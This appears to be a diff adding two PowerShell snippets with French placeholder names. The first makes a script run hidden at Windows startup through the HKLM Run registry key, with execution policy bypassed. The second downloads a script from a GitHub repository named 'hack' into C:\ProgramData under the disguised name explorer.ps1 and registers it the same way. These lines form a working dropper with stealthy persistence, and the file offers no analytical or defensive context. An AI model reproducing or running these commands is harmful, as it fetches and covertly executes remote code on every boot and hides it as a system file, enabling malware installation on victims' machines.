@@ -1,0 +1,7 @@
+ Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NomQueTuVeux" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\chemin\vers\ton_fichier.ps1"
+
+ou 
+
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sash74/hack/main/explorer.ps1" -OutFile "C:\ProgramData\explorer.ps1"
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ExplorerAutoStart" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\ProgramData\explorer.ps1"
